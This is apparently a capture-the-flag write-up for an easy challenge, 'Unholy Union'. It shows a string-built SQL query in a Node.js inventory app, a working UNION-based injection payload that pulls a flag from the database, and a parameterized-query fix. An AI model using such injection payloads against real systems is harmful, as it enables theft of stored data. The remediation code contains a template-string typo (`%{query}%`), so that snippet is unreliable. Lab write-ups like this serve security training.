# Unholy Union
- difficulty: very easy
- vulnerabilities: sqli

## App Review
This super simple app is a self proclaimed inventory manager.  It provides an input box where a user can type in a search term.  Clicking the searh button sends the search phrase to the backend which returns results should they exist.  The lower half of the page provides the exact SQL statement the the search phrase gets put into as well as the exact JSON response from the backend.

## Code Review
The app is obviously geared towards developing SQL injection skills since it contains the SQL query within the frontend UI.  Although its pretty easy to figure out what's going on it is still worthwhile looking at the code to gaina better understanding of how SQL injection vulnerabilities occur.  The vulnerability occurs in the block of code below where userinput, ```query```, is placed directly into the SQL statement without any sanitization.

```
// filename: src/index.js

if (query === "") {
      sqlQuery = "SELECT * FROM inventory";
    } else {
      sqlQuery = `SELECT * FROM inventory WHERE name LIKE '%${query}%'`;
    }
```

## Attack
Looking at the entrypoin.sh file I can see tha the flag gets inserted into flag table of the backend db.
```
# filename: entrypoint.sh

INSERT INTO flag(flag) VALUES("$(cat /flag.txt)");
```
This means the main idea here is to use the SQL injection vulnerability to leak the only entry in the flag table.  The easiest way to do this is to use a union statement to turn the itnended query into the one below.
```
SELECT * FROM inventory WHERE name LIKE '%XXXXXXXXX' union select 1, 'myName', 'myDescription', 'myOrigin', flag from flag-- asdasd'
```
To accomplish this I use the input below.
```
XXXXXXXXX' union select 1, 'myName', 'myDescription', 'myOrigin', flag from flag-- asdasd
```
Going into a bit more detail:
- ```XXXXXXXXX'``` is used to prevent any results being returned due to the initial query.  In other words, just show a single result with the flag.
- ```select 1, 'myName', 'myDescription', 'myOrigin', flag``` The union select must contain 5 columns returned in the result to make the query valid.  Since the initial select query returns 5 columns the union select must also return 5 columns.
## Remediation
This issue can be resolved by using parameterized queries.  I have provided a snippet of code below from src/index.js that utilizes parameterized queries to resolve the issue.
```
// filename: src/index.js

if (query === "") {
    sqlQuery = "SELECT * FROM inventory";
} else {
    sqlQuery = "SELECT * FROM inventory WHERE name LIKE ?";
}

params = [`%{query}%`];

const [rows] = await pool.query(sqlQuery, params);
```